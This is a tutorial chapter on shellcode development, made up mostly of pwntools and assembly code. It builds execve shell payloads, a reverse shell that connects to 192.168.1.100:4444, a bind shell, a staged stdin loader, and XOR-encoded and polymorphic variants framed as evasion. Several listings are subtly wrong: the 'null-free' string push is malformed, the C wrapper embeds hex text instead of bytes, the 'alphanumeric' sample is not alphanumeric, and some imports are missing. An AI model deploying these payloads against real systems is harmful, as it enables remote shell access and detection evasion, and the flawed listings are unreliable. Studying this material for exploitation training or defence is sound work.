# Shellcode Development

Shellcode is a small piece of code used as the payload in the exploitation of software vulnerabilities. It's called "shellcode" because it typically starts a command shell, but modern shellcode can perform various malicious activities.

## Understanding Shellcode

### What is Shellcode?

Shellcode characteristics:
1. **Position-independent** - Works regardless of memory location
2. **Self-contained** - No external dependencies
3. **Compact** - Minimal size for fitting in exploits
4. **Null-byte free** - Avoids string termination issues

### Shellcode Categories

```
Shellcode Types:
┌─────────────────────┐
│   Local Shellcode   │ ← Executes on target machine
├─────────────────────┤
│   Remote Shellcode  │ ← Connects back to attacker
├─────────────────────┤
│   Download & Exec   │ ← Downloads and runs payload
├─────────────────────┤
│   Staged Shellcode  │ ← Multi-stage payload delivery
└─────────────────────┘
```

## Assembly Fundamentals for Shellcode

### System Calls in Assembly

```asm
; Linux x86_64 system call convention:
; rax = syscall number
; rdi = 1st argument
; rsi = 2nd argument  
; rdx = 3rd argument
; r10 = 4th argument
; r8  = 5th argument
; r9  = 6th argument

; execve("/bin/sh", NULL, NULL)
mov rax, 59        ; sys_execve
mov rdi, string    ; filename
mov rsi, 0         ; argv (NULL)
mov rdx, 0         ; envp (NULL)
syscall
```

### Basic Shellcode Structure

```asm
; execve_shellcode.asm
section .text
global _start

_start:
    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    
    ; Clear registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    
    ; Push "/bin/sh\0" onto stack
    push edx           ; null terminator
    push 0x68732f2f    ; "//sh" (little endian)
    push 0x6e69622f    ; "/bin" (little endian)
    
    ; Set up arguments
    mov ebx, esp       ; filename = "/bin/sh"
    push edx           ; NULL (end of argv array)
    push ebx           ; "/bin/sh" (argv[0])
    mov ecx, esp       ; argv array
    
    ; System call
    mov al, 11         ; sys_execve (32-bit)
    int 0x80
```

## Writing Shellcode

### Simple execve Shellcode (64-bit)

```python
#!/usr/bin/env python3
from pwn import *

# Generate shellcode using pwntools
context.arch = 'amd64'

def generate_execve_shellcode():
    """Generate execve("/bin/sh") shellcode"""
    
    # Method 1: Using pwntools
    shellcode = asm(shellcraft.sh())
    print(f"Pwntools shellcode ({len(shellcode)} bytes):")
    print(shellcode.hex())
    
    # Method 2: Manual assembly
    manual_shellcode = asm('''
        xor rsi, rsi        /* argv = NULL */
        xor rdx, rdx        /* envp = NULL */
        
        /* Push "/bin/sh\0" */
        push rsi            /* null terminator */
        mov rdi, 0x68732f2f6e69622f
        push rdi
        
        mov rdi, rsp        /* filename = "/bin/sh" */
        mov rax, 59         /* sys_execve */
        syscall
    ''')
    
    print(f"\nManual shellcode ({len(manual_shellcode)} bytes):")
    print(manual_shellcode.hex())
    
    return shellcode

def test_shellcode(shellcode):
    """Test shellcode in isolated environment"""
    
    # Create executable memory page
    import mmap
    import ctypes
    
    # Allocate executable memory
    mem = mmap.mmap(-1, len(shellcode), 
                   mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                   mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS)
    
    # Copy shellcode to memory
    mem.write(shellcode)
    mem.seek(0)
    
    # Create function pointer and execute
    func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(mem)))
    
    print("Executing shellcode...")
    func()  # This will spawn a shell

# Generate and test
shellcode = generate_execve_shellcode()
# test_shellcode(shellcode)  # Uncomment to test
```

### 32-bit Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def x86_execve_shellcode():
    """Generate 32-bit execve shellcode"""
    
    shellcode = asm('''
        xor eax, eax        /* Clear eax */
        xor ebx, ebx        /* Clear ebx */
        xor ecx, ecx        /* Clear ecx */
        xor edx, edx        /* Clear edx */
        
        /* Push "/bin/sh\0" onto stack */
        push edx            /* null terminator */
        push 0x68732f2f     /* "//sh" */
        push 0x6e69622f     /* "/bin" */
        
        mov ebx, esp        /* ebx = "/bin/sh" */
        
        /* Set up argv array */
        push edx            /* NULL (end of array) */
        push ebx            /* "/bin/sh" (argv[0]) */
        mov ecx, esp        /* ecx = argv */
        
        mov al, 11          /* sys_execve */
        int 0x80            /* system call */
    ''')
    
    print(f"32-bit shellcode ({len(shellcode)} bytes):")
    print(shellcode.hex())
    
    return shellcode

x86_execve_shellcode()
```

### Null-Free Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

def null_free_shellcode():
    """Generate shellcode without null bytes"""
    
    # Problematic: contains null bytes
    bad_shellcode = asm('''
        mov rax, 59         /* Contains null bytes! */
        mov rdi, 0x68732f2f6e69622f
        syscall
    ''')
    
    print(f"Bad shellcode (with nulls): {bad_shellcode.hex()}")
    
    # Null-free version
    good_shellcode = asm('''
        /* Clear registers without null bytes */
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        
        /* Push "/bin/sh" */
        push rax            /* null terminator */
        
        /* Use mov with 32-bit immediate to avoid nulls */
        mov edi, 0x68732f2f  /* "//sh" */
        push rdi
        mov edi, 0x6e69622f  /* "/bin" */
        push rdi
        
        mov rdi, rsp        /* rdi = "/bin/sh" */
        
        /* Use 8-bit register to set syscall number */
        mov al, 59          /* sys_execve */
        syscall
    ''')
    
    print(f"Good shellcode (null-free): {good_shellcode.hex()}")
    
    # Check for null bytes
    if b'\x00' in good_shellcode:
        print("WARNING: Shellcode contains null bytes!")
    else:
        print("Shellcode is null-free!")
    
    return good_shellcode

null_free_shellcode()
```

## Advanced Shellcode Techniques

### Reverse Shell Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

def reverse_shell_shellcode(ip, port):
    """Generate reverse shell shellcode"""
    
    # Convert IP to hex
    ip_parts = ip.split('.')
    ip_hex = struct.pack('!I', 
                        (int(ip_parts[0]) << 24) + 
                        (int(ip_parts[1]) << 16) + 
                        (int(ip_parts[2]) << 8) + 
                        int(ip_parts[3]))
    
    # Convert port to hex (network byte order)
    port_hex = struct.pack('!H', port)
    
    shellcode = asm(f'''
        /* socket(AF_INET, SOCK_STREAM, 0) */
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        
        mov al, 41          /* sys_socket */
        mov dil, 2          /* AF_INET */
        mov sil, 1          /* SOCK_STREAM */
        syscall
        
        mov r8, rax         /* save socket fd */
        
        /* connect(sockfd, &addr, sizeof(addr)) */
        xor rax, rax
        mov al, 42          /* sys_connect */
        mov rdi, r8         /* sockfd */
        
        /* Build sockaddr_in on stack */
        xor r9, r9
        push r9             /* padding */
        
        /* IP address (little endian) */
        mov r9d, {hex(u32(ip_hex))}
        push r9
        
        /* Port and family */
        mov r9w, {hex(u16(port_hex))}
        shl r9, 16
        add r9w, 2          /* AF_INET */
        push r9
        
        mov rsi, rsp        /* &addr */
        mov dl, 16          /* sizeof(addr) */
        syscall
        
        /* dup2(sockfd, 0/1/2) */
        mov rdi, r8         /* sockfd */
        xor rsi, rsi        /* stdin */
        mov al, 33          /* sys_dup2 */
        syscall
        
        mov rdi, r8         /* sockfd */
        mov sil, 1          /* stdout */
        mov al, 33          /* sys_dup2 */
        syscall
        
        mov rdi, r8         /* sockfd */
        mov sil, 2          /* stderr */
        mov al, 33          /* sys_dup2 */
        syscall
        
        /* execve("/bin/sh", NULL, NULL) */
        xor rax, rax
        push rax
        mov rdi, 0x68732f2f6e69622f
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov al, 59          /* sys_execve */
        syscall
    ''')
    
    print(f"Reverse shell shellcode for {ip}:{port} ({len(shellcode)} bytes)")
    print(shellcode.hex())
    
    return shellcode

# Generate reverse shell for 192.168.1.100:4444
reverse_shell_shellcode("192.168.1.100", 4444)
```

### Bind Shell Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

def bind_shell_shellcode(port):
    """Generate bind shell shellcode"""
    
    port_hex = struct.pack('!H', port)
    
    shellcode = asm(f'''
        /* socket(AF_INET, SOCK_STREAM, 0) */
        xor rax, rax
        mov al, 41          /* sys_socket */
        xor rdi, rdi
        mov dil, 2          /* AF_INET */
        xor rsi, rsi
        mov sil, 1          /* SOCK_STREAM */
        xor rdx, rdx        /* protocol = 0 */
        syscall
        
        mov r8, rax         /* save socket fd */
        
        /* bind(sockfd, &addr, sizeof(addr)) */
        xor rax, rax
        mov al, 49          /* sys_bind */
        mov rdi, r8         /* sockfd */
        
        /* Build sockaddr_in */
        xor r9, r9
        push r9             /* INADDR_ANY */
        push r9             /* padding */
        
        mov r9w, {hex(u16(port_hex))}
        shl r9, 16
        add r9w, 2          /* AF_INET */
        push r9
        
        mov rsi, rsp        /* &addr */
        mov dl, 16          /* sizeof(addr) */
        syscall
        
        /* listen(sockfd, 1) */
        xor rax, rax
        mov al, 50          /* sys_listen */
        mov rdi, r8         /* sockfd */
        xor rsi, rsi
        mov sil, 1          /* backlog */
        syscall
        
        /* accept(sockfd, NULL, NULL) */
        xor rax, rax
        mov al, 43          /* sys_accept */
        mov rdi, r8         /* sockfd */
        xor rsi, rsi        /* addr = NULL */
        xor rdx, rdx        /* addrlen = NULL */
        syscall
        
        mov r9, rax         /* save client fd */
        
        /* dup2(clientfd, 0/1/2) */
        mov rdi, r9         /* clientfd */
        xor rsi, rsi        /* stdin */
        mov al, 33          /* sys_dup2 */
        syscall
        
        mov rdi, r9         /* clientfd */
        mov sil, 1          /* stdout */
        mov al, 33          /* sys_dup2 */
        syscall
        
        mov rdi, r9         /* clientfd */
        mov sil, 2          /* stderr */
        mov al, 33          /* sys_dup2 */
        syscall
        
        /* execve("/bin/sh", NULL, NULL) */
        xor rax, rax
        push rax
        mov rdi, 0x68732f2f6e69622f
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov al, 59          /* sys_execve */
        syscall
    ''')
    
    print(f"Bind shell shellcode for port {port} ({len(shellcode)} bytes)")
    print(shellcode.hex())
    
    return shellcode

# Generate bind shell for port 4444
bind_shell_shellcode(4444)
```

### Staged Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

def staged_shellcode():
    """Generate multi-stage shellcode"""
    
    # Stage 1: Small loader that reads larger payload
    stage1 = asm('''
        /* read(stdin, buffer, size) */
        xor rax, rax        /* sys_read */
        xor rdi, rdi        /* stdin */
        
        /* Find a writable location (using current stack) */
        mov rsi, rsp
        sub rsi, 0x1000     /* buffer at stack - 4KB */
        
        mov rdx, 0x1000     /* read up to 4KB */
        syscall
        
        /* Jump to received shellcode */
        jmp rsi
    ''')
    
    print(f"Stage 1 loader ({len(stage1)} bytes):")
    print(stage1.hex())
    
    # Stage 2: Full payload (example: reverse shell)
    stage2 = reverse_shell_shellcode("192.168.1.100", 4444)
    
    return stage1, stage2

def download_exec_shellcode(url):
    """Generate shellcode that downloads and executes payload"""
    
    # Simplified version - real implementation would need HTTP client
    shellcode = asm(f'''
        /* This is a conceptual example */
        /* Real implementation would need to: */
        /* 1. Create socket connection to web server */
        /* 2. Send HTTP GET request */
        /* 3. Parse HTTP response */
        /* 4. Execute downloaded payload */
        
        /* For now, just execute a command */
        xor rax, rax
        push rax
        
        /* Push "wget URL -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload" */
        /* This is simplified - real version would be more complex */
        
        mov rdi, rsp        /* command */
        mov rsi, 0          /* argv */
        mov rdx, 0          /* envp */
        mov rax, 59         /* sys_execve */
        syscall
    ''')
    
    return shellcode

stage1, stage2 = staged_shellcode()
```

## Shellcode Encoding and Evasion

### XOR Encoding

```python
#!/usr/bin/env python3
from pwn import *

def xor_encode_shellcode(shellcode, key=0x41):
    """XOR encode shellcode to avoid bad characters"""
    
    encoded = bytes([b ^ key for b in shellcode])
    
    # Decoder stub
    decoder = asm(f'''
        jmp short call_decoder
        
    decoder:
        pop esi                    /* Get shellcode address */
        xor ecx, ecx
        mov cl, {len(shellcode)}   /* Shellcode length */
        
    decode_loop:
        xor byte ptr [esi], {hex(key)}  /* XOR decode */
        inc esi
        loop decode_loop
        
        jmp short shellcode_start   /* Jump to decoded shellcode */
        
    call_decoder:
        call decoder
        shellcode_start:
    ''')
    
    # Combine decoder + encoded shellcode
    full_payload = decoder + encoded
    
    print(f"Original shellcode: {shellcode.hex()}")
    print(f"XOR key: 0x{key:02x}")
    print(f"Encoded shellcode: {encoded.hex()}")
    print(f"Full payload with decoder: {full_payload.hex()}")
    
    return full_payload

# Example usage
original = asm(shellcraft.sh())
encoded_payload = xor_encode_shellcode(original)
```

### Alphanumeric Shellcode

```python
#!/usr/bin/env python3
from pwn import *

def generate_alphanumeric_shellcode():
    """Generate shellcode using only alphanumeric characters"""
    
    # This is complex and typically done with specialized tools
    # Here's a conceptual example
    
    # Alphanumeric characters: 0-9, A-Z, a-z
    # ASCII values: 0x30-0x39, 0x41-0x5A, 0x61-0x7A
    
    # Use self-modifying code technique
    shellcode = asm('''
        /* Use only alphanumeric instructions */
        /* This is a simplified example */
        
        and eax, 0x454e4f4a     /* Clear eax using alphanumeric */
        and eax, 0x3a313035     /* More clearing */
        
        push eax                /* Push NULL */
        
        /* Build "/bin/sh" using only alphanumeric operations */
        push 0x68732f2f         /* This would need encoding */
        push 0x6e69622f
        
        /* Continue with alphanumeric-only instructions */
    ''')
    
    # Check if all bytes are alphanumeric
    alphanumeric = all(
        (0x30 <= b <= 0x39) or  # 0-9
        (0x41 <= b <= 0x5A) or  # A-Z
        (0x61 <= b <= 0x7A)     # a-z
        for b in shellcode
    )
    
    print(f"Is alphanumeric: {alphanumeric}")
    print(f"Shellcode: {shellcode.hex()}")
    
    return shellcode

generate_alphanumeric_shellcode()
```

### Polymorphic Shellcode

```python
#!/usr/bin/env python3
from pwn import *
import random

def generate_polymorphic_shellcode(base_shellcode):
    """Generate different variants of the same shellcode"""
    
    variants = []
    
    # Variant 1: Add NOPs
    nop_count = random.randint(5, 15)
    variant1 = asm('nop\n' * nop_count) + base_shellcode
    variants.append(variant1)
    
    # Variant 2: Use equivalent instructions
    # Instead of "xor eax, eax", use "sub eax, eax" or "and eax, 0"
    variant2 = asm('''
        sub eax, eax        /* Equivalent to xor eax, eax */
        push eax
        mov eax, 0x68732f2f
        push eax
        mov eax, 0x6e69622f
        push eax
        mov ebx, esp
        push eax
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
    ''')
    variants.append(variant2)
    
    # Variant 3: Use different register allocation
    variant3 = asm('''
        xor ebx, ebx        /* Use ebx instead of eax for clearing */
        push ebx
        mov ebx, 0x68732f2f
        push ebx
        mov ebx, 0x6e69622f
        push ebx
        mov ebx, esp
        xor eax, eax
        push eax
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
    ''')
    variants.append(variant3)
    
    for i, variant in enumerate(variants):
        print(f"Variant {i+1} ({len(variant)} bytes): {variant.hex()}")
    
    return variants

# Generate polymorphic variants
base = asm(shellcraft.sh())
variants = generate_polymorphic_shellcode(base)
```

## Testing and Debugging Shellcode

### Shellcode Testing Framework

```python
#!/usr/bin/env python3
from pwn import *
import tempfile
import os

class ShellcodeTester:
    def __init__(self, arch='amd64'):
        self.arch = arch
        context.arch = arch
    
    def test_in_c_wrapper(self, shellcode):
        """Test shellcode by embedding in C program"""
        
        c_template = f'''
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main() {{
    unsigned char shellcode[] = 
        "{shellcode.hex()}";
    
    printf("Shellcode length: %d\\n", sizeof(shellcode)-1);
    
    // Create executable memory
    void *exec_mem = mmap(NULL, sizeof(shellcode), 
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec_mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    
    // Copy shellcode
    memcpy(exec_mem, shellcode, sizeof(shellcode)-1);
    
    printf("Executing shellcode...\\n");
    
    // Execute shellcode
    ((void(*)())exec_mem)();
    
    return 0;
}}
'''
        
        # Write C file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
            f.write(c_template)
            c_file = f.name
        
        # Compile and run
        binary = c_file.replace('.c', '')
        
        try:
            # Compile
            result = subprocess.run([
                'gcc', '-z', 'execstack', '-fno-stack-protector',
                c_file, '-o', binary
            ], capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"Compilation failed: {result.stderr}")
                return False
            
            print(f"Shellcode test binary created: {binary}")
            print("Run manually to test shellcode execution")
            
            return True
            
        finally:
            # Cleanup
            if os.path.exists(c_file):
                os.unlink(c_file)
    
    def check_bad_chars(self, shellcode, bad_chars=None):
        """Check for bad characters in shellcode"""
        
        if bad_chars is None:
            bad_chars = [b'\x00', b'\x0a', b'\x0d']  # NULL, LF, CR
        
        found_bad = []
        for bad_char in bad_chars:
            if bad_char in shellcode:
                found_bad.append(bad_char.hex())
        
        if found_bad:
            print(f"Bad characters found: {', '.join(found_bad)}")
            return False
        else:
            print("No bad characters found")
            return True
    
    def analyze_shellcode(self, shellcode):
        """Comprehensive shellcode analysis"""
        
        print(f"Shellcode Analysis:")
        print(f"Length: {len(shellcode)} bytes")
        print(f"Hex: {shellcode.hex()}")
        
        # Disassemble
        print(f"\nDisassembly:")
        print(disasm(shellcode))
        
        # Check for bad characters
        self.check_bad_chars(shellcode)
        
        # Entropy analysis
        import collections
        byte_counts = collections.Counter(shellcode)
        entropy = -sum((count/len(shellcode)) * math.log2(count/len(shellcode)) 
                      for count in byte_counts.values())
        print(f"Entropy: {entropy:.2f}")

# Usage example
tester = ShellcodeTester()
shellcode = asm(shellcraft.sh())

tester.analyze_shellcode(shellcode)
tester.test_in_c_wrapper(shellcode)
```

### GDB Shellcode Debugging

```python
#!/usr/bin/env python3
from pwn import *

def debug_shellcode_with_gdb(shellcode):
    """Debug shellcode execution with GDB"""
    
    # Create test binary
    c_code = f'''
#include <sys/mman.h>
#include <string.h>

int main() {{
    unsigned char code[] = "{shellcode.hex()}";
    
    void *exec_mem = mmap(NULL, sizeof(code), 
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    memcpy(exec_mem, code, sizeof(code)-1);
    
    __asm__("int3");  // Breakpoint before execution
    
    ((void(*)())exec_mem)();
    
    return 0;
}}
'''
    
    with open('shellcode_debug.c', 'w') as f:
        f.write(c_code)
    
    # Compile
    os.system('gcc -g -z execstack -o shellcode_debug shellcode_debug.c')
    
    # Generate GDB script
    gdb_script = '''
set disassembly-flavor intel
break main
run
# Step to the int3 breakpoint
continue
# Now step into shellcode
stepi
# Examine memory and registers
info registers
x/20i $pc
'''
    
    with open('debug.gdb', 'w') as f:
        f.write(gdb_script)
    
    print("Created shellcode_debug binary and debug.gdb script")
    print("Run: gdb -x debug.gdb ./shellcode_debug")

# Usage
shellcode = asm(shellcraft.sh())
debug_shellcode_with_gdb(shellcode)
```

## Platform-Specific Shellcode

### Windows Shellcode

```python
#!/usr/bin/env python3
from pwn import *

# Windows shellcode is more complex due to different system call interface
def windows_shellcode_example():
    """Example Windows shellcode structure"""
    
    # Windows uses different calling conventions
    # Need to find kernel32.dll and call WinAPI functions
    
    # This is a conceptual example - real Windows shellcode is much more complex
    shellcode_concept = '''
    ; Windows shellcode typically needs to:
    ; 1. Find kernel32.dll base address
    ; 2. Find GetProcAddress function
    ; 3. Use GetProcAddress to find other functions (CreateProcess, etc.)
    ; 4. Call CreateProcess to spawn cmd.exe
    
    ; Find kernel32.dll from PEB
    xor ecx, ecx
    mov eax, fs:[0x30]      ; PEB
    mov eax, [eax + 0x0c]   ; PEB->Ldr
    mov esi, [eax + 0x1c]   ; PEB->Ldr.InInitializationOrderModuleList
    lodsd                   ; Skip first entry (ntdll.dll)
    xchg eax, esi
    lodsd                   ; Second entry (kernel32.dll)
    mov ebx, [eax + 0x08]   ; DllBase
    
    ; Find GetProcAddress
    ; ... (complex parsing of PE headers)
    
    ; Call CreateProcess
    ; ... (setup parameters and call)
    '''
    
    print("Windows shellcode is significantly more complex than Linux")
    print("Requires finding API functions dynamically")
    print("Consider using msfvenom for Windows payloads")

windows_shellcode_example()
```

### macOS Shellcode

```python
#!/usr/bin/env python3
from pwn import *

def macos_shellcode():
    """macOS/BSD shellcode example"""
    
    # macOS uses different system call numbers and conventions
    context.arch = 'amd64'
    
    shellcode = asm('''
        /* macOS execve("/bin/sh") */
        xor rax, rax
        push rax            /* null terminator */
        
        /* Push "/bin/sh" */
        mov rbx, 0x68732f2f6e69622f
        push rbx
        
        mov rdi, rsp        /* filename */
        xor rsi, rsi        /* argv */
        xor rdx, rdx        /* envp */
        
        mov rax, 0x200003b  /* sys_execve on macOS (0x2000000 + 59) */
        syscall
    ''')
    
    print(f"macOS shellcode ({len(shellcode)} bytes):")
    print(shellcode.hex())
    
    return shellcode

macos_shellcode()
```

## Shellcode Optimization

### Size Optimization

```python
#!/usr/bin/env python3
from pwn import *

def optimize_shellcode_size():
    """Demonstrate shellcode size optimization techniques"""
    
    context.arch = 'amd64'
    
    # Unoptimized version
    unoptimized = asm('''
        mov rax, 0          /* 7 bytes */
        mov rbx, 0          /* 7 bytes */
        mov rcx, 0          /* 7 bytes */
        mov rdx, 0          /* 7 bytes */
    ''')
    
    # Optimized version
    optimized = asm('''
        xor rax, rax        /* 3 bytes */
        xor rbx, rbx        /* 3 bytes */
        xor rcx, rcx        /* 3 bytes */
        xor rdx, rdx        /* 3 bytes */
    ''')
    
    # Even more optimized
    ultra_optimized = asm('''
        xor rax, rax        /* 3 bytes */
        cdq                 /* 1 byte - extends rax to rdx (both become 0) */
        mov rbx, rax        /* 3 bytes */
        mov rcx, rax        /* 3 bytes */
    ''')
    
    print(f"Unoptimized: {len(unoptimized)} bytes")
    print(f"Optimized: {len(optimized)} bytes")
    print(f"Ultra optimized: {len(ultra_optimized)} bytes")
    
    # Demonstrate smallest possible execve
    tiny_execve = asm('''
        xor eax, eax
        push rax
        push 0x68732f2f6e69622f
        mov rdi, rsp
        push rax
        push rdi
        mov rsi, rsp
        mov al, 59
        cdq
        syscall
    ''')
    
    print(f"Tiny execve shellcode: {len(tiny_execve)} bytes")
    print(f"Hex: {tiny_execve.hex()}")

optimize_shellcode_size()
```

## Key Takeaways

!!! important "Shellcode Development Fundamentals"
    - **Position independence** - Code must work at any memory location
    - **Size matters** - Smaller shellcode fits in tighter spaces
    - **Null-byte avoidance** - Prevent string termination issues
    - **System call knowledge** - Understanding OS interfaces is crucial
    - **Testing is essential** - Always verify shellcode functionality

!!! warning "Common Pitfalls"
    - Including null bytes that terminate string functions
    - Platform-specific assumptions (syscall numbers, calling conventions)
    - Forgetting about stack alignment requirements
    - Not testing in realistic environments
    - Hardcoding addresses that may not be available

!!! tip "Development Best Practices"
    - Start with working assembly code, then optimize
    - Use tools like pwntools for rapid prototyping
    - Test thoroughly in controlled environments
    - Consider encoding techniques for evasion
    - Keep platform differences in mind

---

*Next: [Format String Attacks](../memory/01-format-string.md)*
